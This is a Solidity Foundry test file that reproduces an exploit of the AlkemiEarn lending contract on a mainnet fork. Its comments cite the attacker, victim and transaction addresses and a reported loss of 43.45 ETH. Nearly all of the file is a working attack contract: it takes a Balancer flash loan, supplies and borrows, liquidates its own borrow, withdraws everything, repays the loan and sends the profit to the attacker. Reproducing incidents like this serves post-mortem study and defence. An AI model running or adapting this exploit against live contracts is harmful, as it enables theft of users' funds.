// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 43.45 ETH
// Attacker : https://etherscan.io/address/0x0ed1c01b8420a965d7bd2374db02896464c91cd7
// Attack Contract : https://etherscan.io/address/0xE408b52AEfB27A2FB4f1cD760A76DAa4BF23794B
// Vulnerable Contract : https://etherscan.io/address/0x4822D9172e5b76b9Db37B75f5552F9988F98a888
// Attack Tx : https://skylens.certik.com/tx/eth/0xa17001eb39f867b8bed850de9107018a2d2503f95f15e4dceb7d68fff5ef6d9d?active_tab=events

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x4822D9172e5b76b9Db37B75f5552F9988F98a888#code

// @Analysis
// Post-mortem : https://x.com/blockaid_/status/2031351883470676048?s=20
// Twitter Guy : https://x.com/blockaid_

pragma solidity ^0.8.0;

contract AlkemiEarn_exp is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 24626979 - 1;
    address attacker = makeAddr("attacker");
    address victim = 0x4822D9172e5b76b9Db37B75f5552F9988F98a888;
    IAlkemiEarn victimContract = IAlkemiEarn(victim);

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
    }

    function testExploit() public balanceLog2(attacker) {
        vm.startPrank(attacker);
        Attacker attacker = new Attacker();
        attacker.attack();
        vm.stopPrank();

    }
}

contract Attacker {

    IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH weth = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    address victim = 0x4822D9172e5b76b9Db37B75f5552F9988F98a888;
    IAlkemiEarn victimContract = IAlkemiEarn(victim);
    address attacker;
    address aweth = 0x8125afd067094cD573255f82795339b9fe2A40ab;


    function attack() public {
        attacker = msg.sender;
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 51 ether;
        bytes memory userData = "";
        vault.flashLoan(address(this), tokens, amounts, userData);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        weth.withdraw(amounts[0]);
        victimContract.supply{value: 50 ether}( aweth, 50 ether);
        victimContract.borrow(aweth, 39.5 ether);
        uint256 amount = victimContract.getBorrowBalance(address(this), aweth);
        console2.log("amount: ", amount);
        console2.log("balance of eth: ", address(this).balance);
        victimContract.liquidateBorrow{value: amount}(address(this), aweth, aweth, amount);
        victimContract.withdraw(aweth, type(uint256).max);
        weth.deposit{value: 51 ether}();
        weth.transfer(address(vault), amounts[0] + feeAmounts[0]);
        console2.log("balance of eth: ", address(this).balance);
        TransferHelper.safeTransferETH( attacker, address(this).balance);
    }

    fallback() external payable {}
}

interface IAlkemiEarn {
    function supply(address token, uint256 amount) external payable;
    function borrow(address token, uint256 amount) external;
    function getBorrowBalance(address user, address token) external view returns (uint256);
    function liquidateBorrow(address borrower, address borrow, address collateral, uint256 amountClose) external payable;
    function withdraw(address token, uint256 amount) external;
}
